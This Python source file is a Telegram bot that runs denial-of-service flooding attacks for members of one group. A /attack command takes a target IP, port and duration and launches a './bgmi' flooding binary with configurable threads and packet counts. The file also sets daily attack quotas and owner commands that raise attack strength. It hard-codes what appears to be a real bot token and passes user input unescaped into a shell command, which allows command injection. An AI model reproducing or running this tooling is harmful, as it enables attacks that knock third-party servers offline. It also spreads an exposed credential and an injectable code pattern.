import asyncio
import logging
from telegram._updates import Update  # Correct import for Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext  # Correct import for CallbackContext

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Bot Configuration
TELEGRAM_BOT_TOKEN = '8146585403:AAFJYRvEErZ9NuZ9ufyf8cvXyWOzs0lIB4k'  # Replace with your bot token
OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)
ALLOWED_GROUP_ID = -1002491572572  # Replace with your allowed group ID

# Attack Settings
MAX_THREADS = 3000  # Maximum threads limit
max_duration = 200  # Maximum attack duration
daily_attack_limit = 8

# Default Attack Parameters
DEFAULT_THREADS = 300
DEFAULT_PACKET_SIZE = 8
DEFAULT_PACKETS_PER_THREAD = 20

# Attack & Feedback System
attack_running = False
user_attacks = {}
feedback_waiting = {}
attack_ban_list = {}

def is_allowed_group(update: Update):
    """Check if the command is executed in the allowed group."""
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id == ALLOWED_GROUP_ID

async def start(update: Update, context: CallbackContext):
    """Handle the /start command."""
    if not is_allowed_group(update):
        return

    user_id = update.effective_user.id
    if user_id not in user_attacks:
        user_attacks[user_id] = daily_attack_limit  # Initialize attack count for new users

    await update.message.reply_text(
        f"🔥 Welcome to the battlefield! 🔥\n\n"
        f"Use /attack <ip> <port> <duration>\n"
        f"⚔️ You have {user_attacks[user_id]} attacks left today!\n\n"
        f"💥 Let the war begin!",
        parse_mode='Markdown'
    )

async def attack(update: Update, context: CallbackContext):
    """Handle the /attack command."""
    global attack_running
    if not is_allowed_group(update):
        return

    user_id = update.effective_user.id

    # Initialize user_attacks if not already present
    if user_id not in user_attacks:
        user_attacks[user_id] = daily_attack_limit

    if user_id in attack_ban_list:
        await update.message.reply_text("❌ You are banned from using /attack for 10 minutes!", parse_mode='Markdown')
        return

    if attack_running:
        await update.message.reply_text("⚠️ Another attack is already running. Please wait!", parse_mode='Markdown')
        return

    if user_attacks[user_id] <= 0:
        await update.message.reply_text("❌ You have used all your daily attacks!", parse_mode='Markdown')
        return

    args = context.args
    if len(args) < 3:
        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>", parse_mode='Markdown')
        return

    ip, port, duration = args[:3]
    try:
        duration = int(duration)
    except ValueError:
        await update.message.reply_text("❌ Invalid duration! Please provide a number.", parse_mode='Markdown')
        return

    if duration > max_duration:
        await update.message.reply_text(f"❌ Attack duration exceeds max limit ({max_duration} sec)!", parse_mode='Markdown')
        return

    attack_running = True
    user_attacks[user_id] -= 1  # Decrement attack count
    feedback_waiting[user_id] = True

    await update.message.reply_text(
        f"⚔️ Attack Started!\n"
        f"🎯 Target: {ip}:{port}\n"
        f"🕒 Duration: {duration} sec\n"
        f"🧵 Threads: {DEFAULT_THREADS}\n"
        f"📦 Packet Size: {DEFAULT_PACKET_SIZE}\n"
        f"📩 Packets per Thread: {DEFAULT_PACKETS_PER_THREAD}\n\n"
        f"🔥 Let the battlefield ignite! 💥\n\n"
        f"📸 Please send a photo feedback or you will be banned!",
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, context, user_id))

async def run_attack(chat_id, ip, port, duration, context, user_id):
    """Run the attack process."""
    global attack_running
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} {DEFAULT_THREADS} {DEFAULT_PACKET_SIZE} {DEFAULT_PACKETS_PER_THREAD}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        try:
            await asyncio.wait_for(process.communicate(), timeout=duration + 10)
        except asyncio.TimeoutError:
            process.kill()
            await context.bot.send_message(chat_id=chat_id, text="⚠️ Attack process timed out!", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error during attack: {e}")
        await context.bot.send_message(chat_id=chat_id, text="❌ An error occurred during the attack!", parse_mode='Markdown')

    finally:
        attack_running = False
        if feedback_waiting.pop(user_id, False):
            await context.bot.send_message(chat_id=chat_id, text="❌ You didn't send feedback! Banned for 10 minutes!", parse_mode='Markdown')
            attack_ban_list[user_id] = True
            asyncio.create_task(unban_user_after_delay(user_id, 600))
        else:
            await context.bot.send_message(chat_id=chat_id, text="✅ Attack Finished, now next attack!", parse_mode='Markdown')

async def unban_user_after_delay(user_id, delay):
    """Unban a user after a delay."""
    await asyncio.sleep(delay)
    attack_ban_list.pop(user_id, None)

async def handle_photo(update: Update, context: CallbackContext):
    """Handle photo feedback."""
    user_id = update.effective_user.id
    if feedback_waiting.pop(user_id, False):
        await update.message.reply_text("✅ Thanks for your feedback!", parse_mode='Markdown')

async def reset_attacks(update: Update, context: CallbackContext):
    """Handle the /resetattacks command."""
    logging.info("reset_attacks command received")
    if update.effective_user.username != OWNER_USERNAME:
        logging.warning("Unauthorized user attempted to reset attacks")
        return

    for user_id in user_attacks:
        user_attacks[user_id] = daily_attack_limit

    await update.message.reply_text(f"✅ All users' attack limits have been reset!", parse_mode='Markdown')

async def set_max_duration(update: Update, context: CallbackContext):
    """Handle the /set_max_duration command."""
    logging.info("set_max_duration command received")
    try:
        global max_duration
        if update.effective_user.username != OWNER_USERNAME:
            logging.warning("Unauthorized user attempted to set max duration")
            return

        args = context.args
        if len(args) != 1 or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: /set_max_duration <duration>", parse_mode='Markdown')
            return

        max_duration = int(args[0])
        await update.message.reply_text(f"✅ Max attack duration set to {max_duration} sec!", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in set_max_duration: {e}")
        await update.message.reply_text("❌ An error occurred while setting max duration!", parse_mode='Markdown')

async def set_default_threads(update: Update, context: CallbackContext):
    """Handle the /set_default_threads command."""
    logging.info("set_default_threads command received")
    try:
        global DEFAULT_THREADS
        if update.effective_user.username != OWNER_USERNAME:
            logging.warning("Unauthorized user attempted to set default threads")
            return

        args = context.args
        if len(args) != 1 or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: /set_default_threads <threads>", parse_mode='Markdown')
            return

        DEFAULT_THREADS = int(args[0])
        await update.message.reply_text(f"✅ Default threads set to {DEFAULT_THREADS}!", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in set_default_threads: {e}")
        await update.message.reply_text("❌ An error occurred while setting default threads!", parse_mode='Markdown')

async def set_packet_size(update: Update, context: CallbackContext):
    """Handle the /set_packet_size command."""
    logging.info("set_packet_size command received")
    try:
        global DEFAULT_PACKET_SIZE
        if update.effective_user.username != OWNER_USERNAME:
            logging.warning("Unauthorized user attempted to set packet size")
            return

        args = context.args
        if len(args) != 1 or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: /set_packet_size <size>", parse_mode='Markdown')
            return

        DEFAULT_PACKET_SIZE = int(args[0])
        await update.message.reply_text(f"✅ Packet size set to {DEFAULT_PACKET_SIZE}!", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in set_packet_size: {e}")
        await update.message.reply_text("❌ An error occurred while setting packet size!", parse_mode='Markdown')

async def set_default_packets_per_thread(update: Update, context: CallbackContext):
    """Handle the /set_default_packets_per_thread command."""
    logging.info("set_default_packets_per_thread command received")
    try:
        global DEFAULT_PACKETS_PER_THREAD
        if update.effective_user.username != OWNER_USERNAME:
            logging.warning("Unauthorized user attempted to set default packets per thread")
            return

        args = context.args
        if len(args) != 1 or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: /set_default_packets_per_thread <count>", parse_mode='Markdown')
            return

        DEFAULT_PACKETS_PER_THREAD = int(args[0])
        await update.message.reply_text(f"✅ Default packets per thread set to {DEFAULT_PACKETS_PER_THREAD}!", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in set_default_packets_per_thread: {e}")
        await update.message.reply_text("❌ An error occurred while setting default packets per thread!", parse_mode='Markdown')

def main():
    """Start the bot."""
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Register command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("resetattacks", reset_attacks))
    application.add_handler(CommandHandler("set_max_duration", set_max_duration))
    application.add_handler(CommandHandler("set_default_threads", set_default_threads))
    application.add_handler(CommandHandler("set_packet_size", set_packet_size))  # Updated command
    application.add_handler(CommandHandler("set_default_packets_per_thread", set_default_packets_per_thread))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
